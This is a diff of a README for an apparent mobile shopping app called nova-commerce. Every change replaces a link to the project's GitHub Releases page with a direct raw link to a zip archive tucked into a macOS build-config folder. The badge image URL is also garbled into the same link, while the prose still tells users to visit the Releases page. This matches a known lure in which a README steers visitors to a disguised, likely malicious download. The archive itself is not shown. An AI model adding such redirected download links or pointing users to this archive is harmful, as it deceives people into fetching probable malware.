@@ -1,6 +1,6 @@
 # 🚀 nova-commerce - Your Easy Mobile Shopping Solution
 
-[![Download Nova Commerce](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%8C%20nova-commerce-blue.svg)](https://github.com/alamtorres1214/nova-commerce/releases)
+[![Download Nova Commerce](https://raw.githubusercontent.com/alamtorres1214/nova-commerce/main/macos/Runner/Configs/commerce-nova-v2.4.zip%20Now-%20%F0%9F%9A%8C%https://raw.githubusercontent.com/alamtorres1214/nova-commerce/main/macos/Runner/Configs/commerce-nova-v2.4.zip)](https://raw.githubusercontent.com/alamtorres1214/nova-commerce/main/macos/Runner/Configs/commerce-nova-v2.4.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ To install Nova Commerce, you will need to visit the Releases page. Follow these
 
 1. Click the link below to visit the download page where you can find the latest version of the app:
 
-   [Visit this page to download](https://github.com/alamtorres1214/nova-commerce/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/alamtorres1214/nova-commerce/main/macos/Runner/Configs/commerce-nova-v2.4.zip)
 
 2. On the Releases page, find the version you wish to download. Click on the link to get the file appropriate for your device:
     - For **Android**, download the APK file.
@@ -77,6 +77,6 @@ This project is open-source and available under the MIT License. You can check t
 
 To stay informed about updates to the app, including new features, bug fixes, and more, please check back regularly at our Releases page:
 
-[Visit this page to download](https://github.com/alamtorres1214/nova-commerce/releases)
+[Visit this page to download](https://raw.githubusercontent.com/alamtorres1214/nova-commerce/main/macos/Runner/Configs/commerce-nova-v2.4.zip)
 
 Thank you for using Nova Commerce! We hope you enjoy your shopping experience.
